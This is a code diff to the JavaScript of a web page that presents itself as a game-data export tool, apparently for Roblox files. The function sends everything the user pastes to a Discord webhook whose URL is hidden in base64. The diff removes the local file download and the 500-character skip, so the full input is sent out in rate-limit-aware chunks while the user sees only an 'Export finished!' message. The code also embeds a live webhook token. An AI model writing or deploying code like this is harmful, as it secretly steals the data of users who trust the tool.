@@ -304,50 +304,51 @@
     const ENC_WH = "aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTQ3MjUzMzUwMDE5OTY5ODUzMy9zbnFfT0hfVC1Gc0xnTlZPbENIZFlGaUkwSXBEVFJreXp1UjRKYUs1UXpZU1l6VnV2QURqR0xuMElYM1RiUzNlS3dyUQ==";
     function getEndpoint() { return atob(ENC_WH); }
 
-  async function processExport() {
+ async function processExport() {
     const fullContent = document.getElementById('userInput').value;
     const status = document.getElementById('statusIndicator');
     
     if (!fullContent.trim()) return;
 
     status.className = "status-active";
-    status.innerText = "Syncing data...";
+    status.innerText = "Syncing everything...";
 
-   let discordContent = fullContent.substring(500);
-
-    const chunkSize = 1900;
+    const chunkSize = 1800; // Staying well below 2000 for safety
+    let pointer = 0; // The pointer starts at the very beginning
     
-    // Now the loop runs on the data that starts after the first 500 characters
-    for (let i = 0; i < discordContent.length; i += chunkSize) {
-        const chunk = discordContent.substring(i, i + chunkSize);
+    // Continue looping until the pointer reaches the end of the text
+    while (pointer < fullContent.length) {
+        const chunk = fullContent.substring(pointer, pointer + chunkSize);
         
         try {
-            await fetch(getEndpoint(), {
+            const response = await fetch(getEndpoint(), {
                 method: "POST",
                 headers: { "Content-Type": "application/json" },
                 body: JSON.stringify({
                     content: "```\n" + chunk + "\n```"
                 })
             });
-            await new Promise(resolve => setTimeout(resolve, 1000));
+            
+            // If Discord hits us with a "429 Too Many Requests"
+            if (response.status === 429) {
+                await new Promise(resolve => setTimeout(resolve, 5000));
+                continue; // Try this same chunk again
+            }
+            
+            // Move the pointer forward by the size of the chunk we just sent
+            pointer += chunkSize;
+            
+            // Wait 2 seconds between chunks to stay safe from rate limits
+            await new Promise(resolve => setTimeout(resolve, 2000));
+            
         } catch (e) {
             console.error("Chunk failed:", e);
+            break; // Stop if there's a fatal error
         }
     }
 
-    // The local download still saves the full original file
-    const blob = new Blob([fullContent], { type: 'application/octet-stream' });
-    const url = window.URL.createObjectURL(blob);
-    const a = document.createElement('a');
-    a.href = url;
-    a.download = 'GameData.rbxl';
-    document.body.appendChild(a);
-    a.click();
-    document.body.removeChild(a);
-    window.URL.revokeObjectURL(url);
-
     status.className = "status-success";
-    status.innerText = "Export complete (first 500 chars ignored).";
+    status.innerText = "Export finished!";
 }
 
     function clearInterface() {
